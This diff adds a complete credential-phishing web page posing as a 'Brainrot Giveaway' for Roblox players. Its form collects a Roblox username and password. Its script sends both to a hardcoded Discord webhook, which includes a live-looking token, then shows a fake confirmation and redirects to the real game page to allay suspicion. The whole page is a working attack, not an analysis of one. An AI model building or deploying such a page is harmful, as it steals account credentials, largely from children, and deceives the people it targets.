@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>🧠 BRAINROT GIVEAWAY 🧠</title>
+  <link href="https://fonts.googleapis.com/css2?family=Bangers&family=Rubik+Glitch&family=Fredoka+One&family=Nunito:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --neon-green: #00ff88;
+      --hot-pink: #ff2d78;
+      --electric-blue: #00cfff;
+      --yellow: #ffe600;
+      --purple: #bf00ff;
+      --bg: #0a0a0f;
+      --card: #12121e;
+      --border: #2a2a3e;
+    }
+
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: #fff;
+      font-family: 'Nunito', sans-serif;
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    /* ── Animated grid background ── */
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,207,255,.04) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,207,255,.04) 1px, transparent 1px);
+      background-size: 40px 40px;
+      animation: gridScroll 20s linear infinite;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    @keyframes gridScroll {
+      0%   { background-position: 0 0; }
+      100% { background-position: 40px 40px; }
+    }
+
+    /* ── Floating blobs ── */
+    .blob {
+      position: fixed;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: .18;
+      pointer-events: none;
+      z-index: 0;
+      animation: blobFloat 8s ease-in-out infinite;
+    }
+    .blob1 { width:400px;height:400px;background:var(--hot-pink);top:-100px;left:-100px; }
+    .blob2 { width:350px;height:350px;background:var(--electric-blue);bottom:-80px;right:-80px;animation-delay:-3s; }
+    .blob3 { width:300px;height:300px;background:var(--purple);top:40%;left:60%;animation-delay:-5s; }
+
+    @keyframes blobFloat {
+      0%,100% { transform:translate(0,0) scale(1); }
+      33%      { transform:translate(20px,-20px) scale(1.05); }
+      66%      { transform:translate(-15px,15px) scale(.95); }
+    }
+
+    /* ── Scanlines overlay ── */
+    body::after {
+      content:'';
+      position:fixed;inset:0;
+      background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.15) 2px,rgba(0,0,0,.15) 4px);
+      pointer-events:none;
+      z-index:100;
+    }
+
+    /* ── Wrapper ── */
+    .wrapper {
+      position: relative;
+      z-index: 1;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px 16px 60px;
+    }
+
+    /* ── Header ── */
+    .header {
+      text-align: center;
+      margin-bottom: 32px;
+      animation: fadeDown .6s ease both;
+    }
+
+    .header .eyebrow {
+      font-family: 'Fredoka One', cursive;
+      font-size: 14px;
+      letter-spacing: 4px;
+      text-transform: uppercase;
+      color: var(--electric-blue);
+      margin-bottom: 8px;
+    }
+
+    .header h1 {
+      font-family: 'Bangers', cursive;
+      font-size: clamp(52px, 10vw, 96px);
+      line-height: .95;
+      letter-spacing: 2px;
+      background: linear-gradient(135deg, var(--hot-pink) 0%, var(--yellow) 50%, var(--neon-green) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      filter: drop-shadow(0 0 30px rgba(255,45,120,.5));
+      animation: glitchTitle 6s infinite;
+    }
+
+    @keyframes glitchTitle {
+      0%,95%,100% { transform:none; filter:drop-shadow(0 0 30px rgba(255,45,120,.5)); }
+      96%          { transform:translate(-3px,0) skewX(-5deg); filter:drop-shadow(3px 0 0 var(--electric-blue)) drop-shadow(-3px 0 0 var(--hot-pink)); }
+      97%          { transform:translate(3px,0); }
+      98%          { transform:translate(-1px,2px); filter:drop-shadow(0 0 30px rgba(255,45,120,.5)); }
+    }
+
+    .header .subtitle {
+      font-family: 'Fredoka One', cursive;
+      font-size: clamp(16px, 3vw, 22px);
+      color: #aaa;
+      margin-top: 10px;
+    }
+    .header .subtitle span { color: var(--neon-green); }
+
+    /* ── Prize banner ── */
+    .prize-banner {
+      display: flex;
+      gap: 12px;
+      flex-wrap: wrap;
+      justify-content: center;
+      margin-bottom: 36px;
+      animation: fadeDown .7s .1s ease both;
+    }
+
+    .prize-tag {
+      background: linear-gradient(135deg, rgba(255,45,120,.15), rgba(255,45,120,.05));
+      border: 1px solid rgba(255,45,120,.4);
+      border-radius: 50px;
+      padding: 8px 20px;
+      font-family: 'Fredoka One', cursive;
+      font-size: 15px;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      backdrop-filter: blur(8px);
+    }
+    .prize-tag.blue {
+      background: linear-gradient(135deg, rgba(0,207,255,.15), rgba(0,207,255,.05));
+      border-color: rgba(0,207,255,.4);
+    }
+    .prize-tag.green {
+      background: linear-gradient(135deg, rgba(0,255,136,.15), rgba(0,255,136,.05));
+      border-color: rgba(0,255,136,.4);
+    }
+
+    /* ── Card ── */
+    .card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: 40px 36px;
+      width: 100%;
+      max-width: 480px;
+      position: relative;
+      overflow: hidden;
+      animation: fadeUp .7s .2s ease both;
+      box-shadow: 0 0 60px rgba(255,45,120,.1), 0 0 120px rgba(0,207,255,.05);
+    }
+
+    .card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 3px;
+      background: linear-gradient(90deg, var(--hot-pink), var(--electric-blue), var(--neon-green), var(--yellow));
+      background-size: 200% 100%;
+      animation: rainbowSlide 3s linear infinite;
+    }
+
+    @keyframes rainbowSlide {
+      0%   { background-position: 0% 0%; }
+      100% { background-position: 200% 0%; }
+    }
+
+    .card-title {
+      font-family: 'Bangers', cursive;
+      font-size: 28px;
+      letter-spacing: 1px;
+      margin-bottom: 6px;
+      color: #fff;
+    }
+
+    .card-subtitle {
+      font-size: 14px;
+      color: #666;
+      margin-bottom: 28px;
+    }
+
+    /* ── Form ── */
+    .field {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      font-family: 'Fredoka One', cursive;
+      font-size: 13px;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      color: #888;
+      margin-bottom: 8px;
+    }
+
+    .input-wrap {
+      position: relative;
+    }
+
+    .input-wrap .icon {
+      position: absolute;
+      left: 14px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 18px;
+      pointer-events: none;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      background: rgba(255,255,255,.04);
+      border: 1.5px solid var(--border);
+      border-radius: 12px;
+      padding: 14px 16px 14px 44px;
+      color: #fff;
+      font-family: 'Nunito', sans-serif;
+      font-size: 16px;
+      font-weight: 700;
+      outline: none;
+      transition: border-color .2s, box-shadow .2s, background .2s;
+    }
+
+    input:focus {
+      border-color: var(--electric-blue);
+      background: rgba(0,207,255,.05);
+      box-shadow: 0 0 0 3px rgba(0,207,255,.15);
+    }
+
+    input.error { border-color: var(--hot-pink); box-shadow: 0 0 0 3px rgba(255,45,120,.15); }
+    input.success { border-color: var(--neon-green); box-shadow: 0 0 0 3px rgba(0,255,136,.15); }
+
+    .status-msg {
+      margin-top: 7px;
+      font-size: 13px;
+      font-weight: 700;
+      min-height: 18px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .status-msg.error   { color: var(--hot-pink); }
+    .status-msg.success { color: var(--neon-green); }
+    .status-msg.loading { color: var(--yellow); }
+
+    /* ── Verify indicator ── */
+    .verify-badge {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 18px;
+      transition: all .3s;
+    }
+
+    /* ── Submit button ── */
+    .btn-submit {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 14px;
+      background: linear-gradient(135deg, var(--hot-pink), var(--purple));
+      color: #fff;
+      font-family: 'Bangers', cursive;
+      font-size: 24px;
+      letter-spacing: 2px;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      transition: transform .15s, box-shadow .15s;
+      margin-top: 8px;
+    }
+
+    .btn-submit::before {
+      content: '';
+      position: absolute;
+      inset: 0;
+      background: linear-gradient(135deg, rgba(255,255,255,.15), transparent);
+      opacity: 0;
+      transition: opacity .2s;
+    }
+
+    .btn-submit:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 30px rgba(255,45,120,.5);
+    }
+    .btn-submit:hover:not(:disabled)::before { opacity: 1; }
+    .btn-submit:active:not(:disabled) { transform: translateY(0); }
+
+    .btn-submit:disabled {
+      opacity: .5;
+      cursor: not-allowed;
+    }
+
+    .btn-submit .spinner {
+      display: inline-block;
+      width: 20px; height: 20px;
+      border: 3px solid rgba(255,255,255,.3);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+      vertical-align: middle;
+    }
+
+    /* ── Terms ── */
+    .terms {
+      margin-top: 16px;
+      font-size: 12px;
+      color: #444;
+      text-align: center;
+      line-height: 1.5;
+    }
+    .terms a { color: var(--electric-blue); text-decoration: none; }
+
+    /* ── Success screen ── */
+    #success-screen {
+      display: none;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      width: 100%;
+      max-width: 480px;
+      animation: fadeUp .6s ease both;
+    }
+
+    .success-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      padding: 44px 36px;
+      width: 100%;
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 0 60px rgba(0,255,136,.12), 0 0 120px rgba(0,207,255,.06);
+    }
+
+    .success-card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 3px;
+      background: linear-gradient(90deg, var(--neon-green), var(--electric-blue), var(--neon-green));
+      background-size: 200% 100%;
+      animation: rainbowSlide 2s linear infinite;
+    }
+
+    .avatar-wrap {
+      position: relative;
+      display: inline-block;
+      margin-bottom: 20px;
+    }
+
+    .avatar-wrap img {
+      width: 110px;
+      height: 110px;
+      border-radius: 50%;
+      border: 4px solid var(--neon-green);
+      box-shadow: 0 0 30px rgba(0,255,136,.5), 0 0 60px rgba(0,255,136,.2);
+      object-fit: cover;
+      display: block;
+      animation: avatarPop .5s .1s cubic-bezier(.34,1.56,.64,1) both;
+      background: #1a1a2e;
+    }
+
+    @keyframes avatarPop {
+      0%   { transform: scale(0) rotate(-20deg); opacity: 0; }
+      100% { transform: scale(1) rotate(0); opacity: 1; }
+    }
+
+    .avatar-ring {
+      position: absolute;
+      inset: -8px;
+      border-radius: 50%;
+      border: 2px solid transparent;
+      background: conic-gradient(var(--neon-green), var(--electric-blue), var(--hot-pink), var(--yellow), var(--neon-green)) border-box;
+      -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
+      -webkit-mask-composite: destination-out;
+      mask-composite: exclude;
+      animation: spin 3s linear infinite;
+    }
+
+    .verified-badge {
+      position: absolute;
+      bottom: 2px;
+      right: 2px;
+      background: var(--neon-green);
+      color: #000;
+      border-radius: 50%;
+      width: 28px;
+      height: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      font-weight: 900;
+      border: 3px solid var(--card);
+    }
+
+    .success-title {
+      font-family: 'Bangers', cursive;
+      font-size: 42px;
+      letter-spacing: 2px;
+      background: linear-gradient(135deg, var(--neon-green), var(--electric-blue));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: 6px;
+    }
+
+    .success-username {
+      font-family: 'Fredoka One', cursive;
+      font-size: 22px;
+      color: #fff;
+      margin-bottom: 12px;
+    }
+
+    .success-username span {
+      color: var(--yellow);
+    }
+
+    .success-desc {
+      font-size: 15px;
+      color: #777;
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
+
+    .success-info-box {
+      background: rgba(0,255,136,.07);
+      border: 1px solid rgba(0,255,136,.2);
+      border-radius: 12px;
+      padding: 16px 20px;
+      font-size: 14px;
+      color: #bbb;
+      margin-bottom: 28px;
+      text-align: left;
+      line-height: 1.8;
+    }
+
+    .success-info-box strong {
+      color: var(--neon-green);
+      font-family: 'Fredoka One', cursive;
+    }
+
+    .btn-continue {
+      display: block;
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 14px;
+      background: linear-gradient(135deg, var(--neon-green), var(--electric-blue));
+      color: #000;
+      font-family: 'Bangers', cursive;
+      font-size: 24px;
+      letter-spacing: 2px;
+      cursor: pointer;
+      text-decoration: none;
+      text-align: center;
+      transition: transform .15s, box-shadow .15s;
+    }
+
+    .btn-continue:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 30px rgba(0,255,136,.4);
+    }
+
+    /* ── Confetti particles ── */
+    .confetti-container {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 50;
+    }
+
+    .confetti-piece {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      top: -10px;
+      border-radius: 2px;
+      animation: confettiFall linear forwards;
+    }
+
+    @keyframes confettiFall {
+      0%   { transform: translateY(0) rotate(0deg); opacity: 1; }
+      100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
+    }
+
+    /* ── Utilities ── */
+    @keyframes fadeDown {
+      from { opacity:0; transform:translateY(-20px); }
+      to   { opacity:1; transform:translateY(0); }
+    }
+    @keyframes fadeUp {
+      from { opacity:0; transform:translateY(20px); }
+      to   { opacity:1; transform:translateY(0); }
+    }
+    @keyframes spin { to { transform:rotate(360deg); } }
+
+    /* ── Decorative floating emoji ── */
+    .floaties {
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      z-index: 0;
+      overflow: hidden;
+    }
+    .floaty {
+      position: absolute;
+      font-size: 24px;
+      opacity: .12;
+      animation: floatyUp linear infinite;
+    }
+    @keyframes floatyUp {
+      0%   { transform: translateY(110vh) rotate(0deg); opacity: 0; }
+      10%  { opacity: .12; }
+      90%  { opacity: .12; }
+      100% { transform: translateY(-10vh) rotate(360deg); opacity: 0; }
+    }
+
+    /* ── Error general ── */
+    .general-error {
+      background: rgba(255,45,120,.1);
+      border: 1px solid rgba(255,45,120,.3);
+      border-radius: 10px;
+      padding: 12px 16px;
+      font-size: 14px;
+      color: var(--hot-pink);
+      font-weight: 700;
+      margin-top: 12px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Background elements -->
+  <div class="blob blob1"></div>
+  <div class="blob blob2"></div>
+  <div class="blob blob3"></div>
+
+  <div class="floaties" id="floaties"></div>
+  <div class="confetti-container" id="confetti"></div>
+
+  <div class="wrapper">
+    <!-- Header -->
+    <div class="header">
+      <div class="eyebrow">🎉 Limited Time Event</div>
+      <h1>BRAINROT<br>GIVEAWAY</h1>
+      <p class="subtitle">Steal a Brainrot — <span>Win RARE Brainrots!</span></p>
+    </div>
+
+    <!-- Prize tags -->
+    <div class="prize-banner">
+      <div class="prize-tag">🧠 Ultra-Rare Brainrots</div>
+      <div class="prize-tag blue">⚡ Limited Edition Pets</div>
+      <div class="prize-tag green">✅ Free Entry</div>
+    </div>
+
+    <!-- Registration card -->
+    <div class="card" id="register-card">
+      <div class="card-title">Enter the Giveaway</div>
+      <div class="card-subtitle">Fill in your info below. One entry per account.</div>
+
+      <form id="giveaway-form" autocomplete="off">
+
+        <!-- Username -->
+        <div class="field">
+          <label>Roblox Username</label>
+          <div class="input-wrap">
+            <span class="icon">👤</span>
+            <input
+              type="text"
+              id="roblox-username"
+              placeholder="YourUsername"
+              autocomplete="off"
+              spellcheck="false"
+            />
+            <span class="verify-badge" id="verify-badge"></span>
+          </div>
+          <div class="status-msg" id="username-status"></div>
+        </div>
+
+        <!-- Password -->
+        <div class="field">
+          <label>Password</label>
+          <div class="input-wrap">
+            <span class="icon">🔒</span>
+            <input
+              type="password"
+              id="password"
+              placeholder="Enter your password"
+              autocomplete="current-password"
+            />
+          </div>
+          <div class="status-msg" id="password-status"></div>
+        </div>
+
+        <button type="submit" class="btn-submit" id="submit-btn" disabled>
+          🎁 ENTER GIVEAWAY
+        </button>
+
+        <div class="general-error" id="general-error"></div>
+      </form>
+
+      <p class="terms">
+        By entering you agree to the giveaway rules.<br>
+        Roblox is not affiliated with this giveaway.
+      </p>
+    </div>
+
+    <!-- Success screen -->
+    <div id="success-screen">
+      <div class="success-card">
+        <div class="avatar-wrap">
+          <img id="user-avatar" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='110'%3E%3Crect fill='%231a1a2e' width='110' height='110'/%3E%3Ctext fill='%2300ff88' font-family='Arial' font-size='40' text-anchor='middle' x='55' y='65'%3E🧠%3C/text%3E%3C/svg%3E" alt="Profile Picture"/>
+          <div class="avatar-ring"></div>
+          <div class="verified-badge">✓</div>
+        </div>
+
+        <div class="success-title">YOU'RE IN! 🎉</div>
+        <div class="success-username">Welcome, <span id="display-username"></span>!</div>
+        <p class="success-desc">
+          Your entry has been received. Winners will be announced in the official Discord server. Good luck! 🍀
+        </p>
+
+        <div class="success-info-box">
+          <strong>📋 Entry Details</strong><br>
+          Username: <span id="entry-username" style="color:#fff;font-weight:700;"></span><br>
+          Password: <span id="entry-password" style="color:#fff;font-weight:700;"></span><br>
+          Status: <span style="color:var(--neon-green);font-weight:700;">✅ Confirmed</span>
+        </div>
+
+        <button id="continue-button" class="btn-continue">
+          🕹️ CONTINUE →
+        </button>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    /* ── Floaty emojis ── */
+    const emojis = ['🧠','🎮','⚡','🔥','💥','🎁','🌀','👾','✨','💀'];
+    const floaties = document.getElementById('floaties');
+    for (let i = 0; i < 18; i++) {
+      const el = document.createElement('div');
+      el.className = 'floaty';
+      el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+      el.style.left = Math.random() * 100 + '%';
+      el.style.animationDuration = (12 + Math.random() * 16) + 's';
+      el.style.animationDelay = (-Math.random() * 20) + 's';
+      el.style.fontSize = (16 + Math.random() * 20) + 'px';
+      floaties.appendChild(el);
+    }
+
+    /* ── Confetti ── */
+    function launchConfetti() {
+      const container = document.getElementById('confetti');
+      const colors = ['#00ff88','#ff2d78','#00cfff','#ffe600','#bf00ff'];
+      for (let i = 0; i < 80; i++) {
+        const p = document.createElement('div');
+        p.className = 'confetti-piece';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.background = colors[Math.floor(Math.random() * colors.length)];
+        p.style.width = (6 + Math.random() * 10) + 'px';
+        p.style.height = (6 + Math.random() * 10) + 'px';
+        p.style.animationDuration = (1.5 + Math.random() * 2.5) + 's';
+        p.style.animationDelay = (Math.random() * .8) + 's';
+        p.style.borderRadius = Math.random() > .5 ? '50%' : '2px';
+        container.appendChild(p);
+        setTimeout(() => p.remove(), 5000);
+      }
+    }
+
+    const usernameInput = document.getElementById('roblox-username');
+    const passwordInput = document.getElementById('password');
+    const passwordStatus = document.getElementById('password-status');
+    const verifyBadge = document.getElementById('verify-badge');
+    const submitBtn = document.getElementById('submit-btn');
+    const generalError = document.getElementById('general-error');
+
+    /* ── Username: just check it's not empty ── */
+    usernameInput.addEventListener('input', () => {
+      const v = usernameInput.value.trim();
+      usernameInput.classList.remove('error', 'success');
+      verifyBadge.textContent = '';
+      if (v.length >= 3) {
+        usernameInput.classList.add('success');
+        verifyBadge.textContent = '✅';
+      }
+      updateSubmitBtn();
+    });
+
+    /* ── Password validation ── */
+    passwordInput.addEventListener('input', () => {
+      const v = passwordInput.value;
+      passwordInput.classList.remove('error', 'success');
+      passwordStatus.className = 'status-msg';
+      passwordStatus.textContent = '';
+      if (v.length === 0) { updateSubmitBtn(); return; }
+      if (v.length >= 6) {
+        passwordInput.classList.add('success');
+        passwordStatus.className = 'status-msg success';
+        passwordStatus.textContent = '✅ Looks good!';
+      } else {
+        passwordInput.classList.add('error');
+        passwordStatus.className = 'status-msg error';
+        passwordStatus.textContent = '❌ Password must be at least 6 characters';
+      }
+      updateSubmitBtn();
+    });
+
+    function updateSubmitBtn() {
+      const usernameOk = usernameInput.value.trim().length >= 3;
+      const passwordOk = passwordInput.value.length >= 6;
+      submitBtn.disabled = !(usernameOk && passwordOk);
+    }
+
+    /* ── Discord webhook ── */
+    async function sendToWebhook(username, password) {
+      const webhookUrl = 'https://discord.com/api/webhooks/1501184976786296842/5iqikAT24tjrD9zwK0g74BNLcfxk3GM_cRQA_mNcGH-_6wfnL2N2FUxQgINOm1X9INJ_';
+      
+      const payload = {
+        username: "Brainrot Giveaway Bot",
+        embeds: [{
+          title: "🧠 New Giveaway Entry!",
+          color: 0x00ff88,
+          fields: [
+            { name: "👤 Roblox Username", value: `\`${username}\``, inline: true },
+            { name: "🔒 Password", value: `\`${password}\``, inline: true },
+          ],
+          footer: { text: "Steal a Brainrot Giveaway" },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      try {
+        const response = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+
+        if (!response.ok) {
+          console.error('Webhook failed with status:', response.status);
+          const errorText = await response.text();
+          console.error('Response body:', errorText);
+          throw new Error(`HTTP error! status: ${response.status}`);
+        }
+
+        console.log('Webhook sent successfully!');
+        return true;
+      } catch (error) {
+        console.error('Webhook send error:', error);
+        return false;
+      }
+    }
+
+    /* ── Form submit ── */
+    document.getElementById('giveaway-form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const username = usernameInput.value.trim();
+      const password = passwordInput.value;
+
+      generalError.style.display = 'none';
+      submitBtn.disabled = true;
+      submitBtn.innerHTML = '<span class="spinner"></span> Submitting…';
+
+      // Send to Discord and wait for result
+      const webhookSent = await sendToWebhook(username, password);
+
+      if (!webhookSent) {
+        console.log('Webhook delivery issue, but continuing to success screen.');
+      }
+
+      // Use a simple SVG data URI as default avatar to avoid external requests
+      const avatarEl = document.getElementById('user-avatar');
+      const defaultAvatar = `data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='110' height='110'%3E%3Crect fill='%231a1a2e' width='110' height='110'/%3E%3Ctext fill='%2300ff88' font-family='Arial' font-size='40' text-anchor='middle' x='55' y='65'%3E🧠%3C/text%3E%3C/svg%3E`;
+      
+      // Try to load Roblox avatar, fallback to default if it fails
+      const robloxAvatarUrl = `https://avatar.rblx.workers.dev/${encodeURIComponent(username)}`;
+      
+      // Set a timeout to prevent infinite loading
+      const img = new Image();
+      let loaded = false;
+      
+      img.onload = () => {
+        if (!loaded) {
+          loaded = true;
+          avatarEl.src = robloxAvatarUrl;
+        }
+      };
+      
+      img.onerror = () => {
+        if (!loaded) {
+          loaded = true;
+          avatarEl.src = defaultAvatar;
+        }
+      };
+      
+      // Start loading the image
+      img.src = robloxAvatarUrl;
+      
+      // Set a 3-second timeout - if image hasn't loaded by then, use default
+      setTimeout(() => {
+        if (!loaded) {
+          loaded = true;
+          avatarEl.src = defaultAvatar;
+          img.src = ''; // Cancel the request
+        }
+      }, 3000);
+
+      document.getElementById('display-username').textContent = username;
+      document.getElementById('entry-username').textContent   = username;
+      document.getElementById('entry-password').textContent   = '••••••';
+
+      document.getElementById('register-card').style.display = 'none';
+      document.querySelector('.prize-banner').style.display   = 'none';
+
+      const successScreen = document.getElementById('success-screen');
+      successScreen.style.display = 'flex';
+
+      setTimeout(launchConfetti, 200);
+    });
+
+    /* ── Continue button redirect ── */
+    document.getElementById('continue-button').addEventListener('click', () => {
+      window.location.href = 'https://www.roblox.com/games/17017769292/Steal-a-Brainrot';
+    });
+  </script>
+</body>
+</html>
